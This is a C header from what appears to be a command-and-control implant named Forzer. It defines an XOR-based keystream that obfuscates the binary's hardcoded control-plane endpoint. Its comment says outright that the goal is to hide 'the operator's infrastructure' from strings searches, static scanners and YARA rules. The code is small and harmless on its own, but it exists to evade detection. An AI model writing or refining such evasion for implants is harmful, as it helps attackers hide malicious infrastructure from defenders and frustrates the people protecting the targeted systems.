#ifndef FORZER_URLKEY_H
#define FORZER_URLKEY_H

/* Keystream for the built-in control-plane endpoint.

   Shared by three things that MUST agree bit-for-bit:
     - this header, included by Forzer.c (runtime decode)
     - urlenc.c   (dev tool that prints the obfuscated array)
     - build.ps1  (its -Server switch, when you embed a different endpoint)

   It is deliberately arithmetic-only (multiply by small constants, XOR, mask)
   so the PowerShell mirror in build.ps1 reproduces it without any 32-bit
   wraparound-multiply semantics to get wrong. Keep build.ps1's copy in step
   when you touch this.

   This is obfuscation, not cryptography: it exists so `strings Forzer.exe |
   grep wss` does not hand over the operator's infrastructure, and so the
   endpoint is not a one-grep indicator for a static scanner or a YARA rule.
   A determined reverse engineer can still recover the URL from the binary —
   anything with a single hardcoded endpoint can. That is fine; the goal is
   to defeat greppable plaintext, not to defeat a debugger. */
static unsigned char url_ks(unsigned int i) {
    return (unsigned char)((((i * 37u) + 0x5Au) ^ ((i * 3u) + 0x1Fu)) & 0xFFu);
}

#endif /* FORZER_URLKEY_H */
